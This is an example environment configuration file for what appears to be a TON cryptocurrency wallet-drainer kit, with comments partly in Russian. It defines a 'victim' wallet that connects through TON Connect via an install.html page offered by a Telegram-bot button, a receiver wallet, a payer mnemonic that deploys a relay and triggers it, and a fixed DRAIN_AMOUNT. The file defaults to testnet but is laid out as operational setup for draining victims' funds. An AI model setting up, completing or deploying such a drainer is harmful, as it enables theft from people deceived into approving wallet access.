# testnet: https://testnet.toncenter.com/api/v2/jsonRPC
# mainnet: https://toncenter.com/api/v2/jsonRPC
TON_ENDPOINT=https://testnet.toncenter.com/api/v2/jsonRPC
TONCENTER_API_KEY=

# -3 testnet, -239 mainnet
NETWORK_GLOBAL_ID=-3

# Victim W5 (C) — обязателен для TON Connect (install.html, без seed в .env)
WALLET_VICTIM=EQ...

# Опционально: только для npm run install-ext / remove-ext (не нужен при install.html)
# MNEMONIC_A=

# Receiver (B)
WALLET_B=EQ...

# Payer — deploy relay + npm run trigger (отдельный W5, не жертва C)
MNEMONIC_TRIGGER="word1 word2 ..."

# Зашивается в relay при deploy (нужен redeploy после смены)
DRAIN_AMOUNT=0.1

# Опционально: кнопка в Telegram-боте → install.html (после npm run manifest:local / deploy на Vercel)
# PUBLIC_INSTALL_URL=http://127.0.0.1:8080/install.html
